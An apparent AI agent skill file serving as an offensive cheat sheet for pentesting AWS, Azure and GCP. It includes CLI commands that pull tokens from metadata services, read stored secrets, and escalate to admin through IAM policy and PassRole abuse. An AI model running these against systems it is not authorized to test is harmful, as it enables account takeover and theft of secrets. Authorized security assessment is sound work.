---
name: exploiting-cloud-platforms
description: Exploit AWS, Azure, and GCP cloud misconfigurations including S3 buckets, IAM roles, metadata services, serverless functions, and cloud-specific privilege escalation. Use when pentesting cloud environments or assessing cloud security.
---

# Exploiting Cloud Platforms

## When to Use

- AWS, Azure, or GCP security assessment
- Cloud misconfiguration exploitation
- S3/Blob/Storage bucket hunting
- Cloud IAM privilege escalation
- Serverless function exploitation
- Cloud metadata service abuse

## AWS Security

### AWS CLI Setup

```bash
# Configure credentials
aws configure
# Or export directly
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_DEFAULT_REGION=us-east-1

# Test credentials
aws sts get-caller-identity

# List available regions
aws ec2 describe-regions
```

### S3 Bucket Enumeration

```bash
# List buckets
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name/
aws s3 ls s3://bucket-name/ --recursive

# Download bucket contents
aws s3 sync s3://bucket-name/ ./local-folder/

# Check public access
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Test unauthenticated access
aws s3 ls s3://bucket-name/ --no-sign-request
curl https://bucket-name.s3.amazonaws.com/
```

**S3 Bucket Discovery:**
```bash
# Common naming patterns
company-backup
company-data
company-dev
company-prod
company-logs
company-assets

# Tools
# s3scanner
python3 s3scanner.py buckets.txt

# S3 Inspector
python3 s3inspector.py --bucket-file buckets.txt
```

### IAM Enumeration

```bash
# Current user info
aws sts get-caller-identity

# List IAM users (if allowed)
aws iam list-users

# List user policies
aws iam list-attached-user-policies --user-name username
aws iam list-user-policies --user-name username

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/PolicyName
aws iam get-policy-version --policy-arn arn --version-id v1

# List roles
aws iam list-roles

# List groups
aws iam list-groups
```

### EC2 Enumeration

```bash
# List instances
aws ec2 describe-instances

# Get instance metadata (from instance)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# List security groups
aws ec2 describe-security-groups

# List key pairs
aws ec2 describe-key-pairs

# List snapshots
aws ec2 describe-snapshots --owner-ids self

# Public snapshots by account
aws ec2 describe-snapshots --owner-ids 123456789012 --restorable-by-user-ids all
```

### Lambda Functions

```bash
# List functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name function-name

# Invoke function
aws lambda invoke --function-name function-name output.txt

# Get function configuration
aws lambda get-function-configuration --function-name function-name
```

### RDS Enumeration

```bash
# List DB instances
aws rds describe-db-instances

# List DB snapshots
aws rds describe-db-snapshots

# Check if publicly accessible
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,PubliclyAccessible]'
```

### Secrets Manager

```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id secret-name
```

### CloudTrail (Logging)

```bash
# Check if CloudTrail is enabled
aws cloudtrail describe-trails

# Check trail status
aws cloudtrail get-trail-status --name trail-name

# Get recent events
aws cloudtrail lookup-events
```

### AWS Privilege Escalation

**Common Misconfigurations:**
```bash
# iam:CreatePolicyVersion - modify existing policies
# iam:SetDefaultPolicyVersion - set older policy version
# iam:PassRole + lambda:CreateFunction - execute code as role
# iam:AttachUserPolicy - attach admin policy to self
# iam:PutUserPolicy - add inline policy to self
# iam:CreateAccessKey - create keys for other users
# iam:UpdateAssumeRolePolicy - modify trust relationships
```

**Exploitation Examples:**
```bash
# Create access key for admin user (if iam:CreateAccessKey)
aws iam create-access-key --user-name admin-user

# Attach admin policy (if iam:AttachUserPolicy)
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# PassRole + Lambda
aws lambda create-function --function-name evil --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler lambda_function.lambda_handler --zip-file fileb://function.zip
aws lambda invoke --function-name evil output.txt
```

## Azure Security

### Azure CLI Setup

```bash
# Login
az login

# Login with service principal
az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID

# Get current account
az account show

# List subscriptions
az account list
```

### Blob Storage Enumeration

```bash
# List storage accounts
az storage account list

# List containers
az storage container list --account-name accountname

# List blobs
az storage blob list --container-name containername --account-name accountname

# Download blob
az storage blob download --container-name containername --name filename --account-name accountname

# Check public access
az storage container show --name containername --account-name accountname

# Test unauthenticated access
curl https://accountname.blob.core.windows.net/container/file
```

**Blob Discovery:**
```bash
# Common patterns
companyname
companyname-backup
companyname-data
companyname-files

# MicroBurst (PowerShell)
Invoke-EnumerateAzureBlobs -Base company
```

### VM Enumeration

```bash
# List VMs
az vm list

# List VM images
az vm image list

# Get VM details
az vm show --resource-group RG --name VMname

# List NICs
az network nic list

# List public IPs
az network public-ip list
```

### Azure AD Enumeration

```bash
# List users
az ad user list

# Get current user
az ad signed-in-user show

# List groups
az ad group list

# List service principals
az ad sp list

# List applications
az ad app list
```

### Function Apps

```bash
# List function apps
az functionapp list

# Get function app details
az functionapp show --name functionappname --resource-group RG

# List functions
az functionapp function list --name functionappname --resource-group RG

# Download function code
az functionapp deployment source config-zip --name functionappname --resource-group RG
```

### Key Vault

```bash
# List key vaults
az keyvault list

# List secrets
az keyvault secret list --vault-name vaultname

# Get secret
az keyvault secret show --name secretname --vault-name vaultname
```

### Azure Metadata Service

```bash
# From Azure VM
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## GCP Security

### gcloud Setup

```bash
# Login
gcloud auth login

# Login with service account
gcloud auth activate-service-account --key-file=key.json

# Get current account
gcloud config list

# List projects
gcloud projects list
```

### Storage Bucket Enumeration

```bash
# List buckets
gsutil ls

# List bucket contents
gsutil ls gs://bucket-name/

# Download files
gsutil cp gs://bucket-name/file.txt ./

# Check bucket permissions
gsutil iam get gs://bucket-name/

# Test unauthenticated access
curl https://storage.googleapis.com/bucket-name/file.txt
```

**Bucket Discovery:**
```bash
# Common patterns
company-backup
company-data
company_backup
company_data

# GCPBucketBrute
python3 gcpbucketbrute.py -k company
```

### Compute Engine

```bash
# List instances
gcloud compute instances list

# Get instance details
gcloud compute instances describe instance-name --zone=zone

# List disks
gcloud compute disks list

# List snapshots
gcloud compute snapshots list

# List firewall rules
gcloud compute firewall-rules list
```

### IAM Enumeration

```bash
# List service accounts
gcloud iam service-accounts list

# Get IAM policy
gcloud projects get-iam-policy PROJECT_ID

# List roles
gcloud iam roles list

# Describe role
gcloud iam roles describe roles/editor
```

### Cloud Functions

```bash
# List functions
gcloud functions list

# Describe function
gcloud functions describe function-name --region=region

# Download source code (if accessible)
gcloud functions describe function-name --region=region --format="value(sourceArchiveUrl)"
```

### GCP Metadata Service

```bash
# From GCP VM
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"

# Get access token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" -H "Metadata-Flavor: Google"
```

## Cloud Exploitation Tools

**AWS:**
```bash
# Pacu - AWS exploitation framework
python3 pacu.py

# ScoutSuite - Security auditing
python3 scout.py aws

# Prowler - Security assessment
./prowler -M csv

# WeirdAAL - AWS attack library
python3 weirdAAL.py
```

**Azure:**
```bash
# MicroBurst - PowerShell toolkit
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs
Invoke-EnumerateAzureSubDomains

# ScoutSuite
python3 scout.py azure

# ROADtools - Azure AD
roadrecon auth
roadrecon gather
roadrecon gui
```

**GCP:**
```bash
# ScoutSuite
python3 scout.py gcp

# GCP-IAM-Privilege-Escalation
# Check for privilege escalation paths
```

## Quick Cloud Wins

**AWS:**
- Public S3 buckets with sensitive data
- Overly permissive IAM policies
- Unencrypted snapshots
- Public RDS instances
- Lambda functions with secrets in environment variables
- EC2 metadata service abuse (SSRF)

**Azure:**
- Public blob storage containers
- Overly permissive RBAC
- Exposed Key Vault secrets
- Public-facing VMs with weak credentials
- Function apps with hardcoded secrets

**GCP:**
- Public storage buckets
- Overly permissive IAM bindings
- Public compute instances
- Service account key exposure
- Cloud Functions with secrets in code

## Common Cloud Misconfigurations

1. **Public Storage** - S3/Blob/GCS buckets with public read/write
2. **Excessive Permissions** - Overly permissive IAM/RBAC policies
3. **Exposed Secrets** - Keys/passwords in code, environment variables
4. **No MFA** - Critical accounts without multi-factor authentication
5. **Open Security Groups** - 0.0.0.0/0 access on sensitive ports
6. **Unencrypted Data** - Storage/databases without encryption
7. **Default Credentials** - Services using default passwords
8. **Exposed Metadata** - SSRF to cloud metadata services
9. **Public Snapshots** - EBS/disk snapshots publicly accessible
10. **CloudTrail Disabled** - No logging of API calls

## References

- https://book.hacktricks.xyz/pentesting-web/buckets
- https://github.com/RhinoSecurityLabs/pacu
- https://github.com/NetSPI/MicroBurst
- https://github.com/nccgroup/ScoutSuite
- https://cloudsecdocs.com/
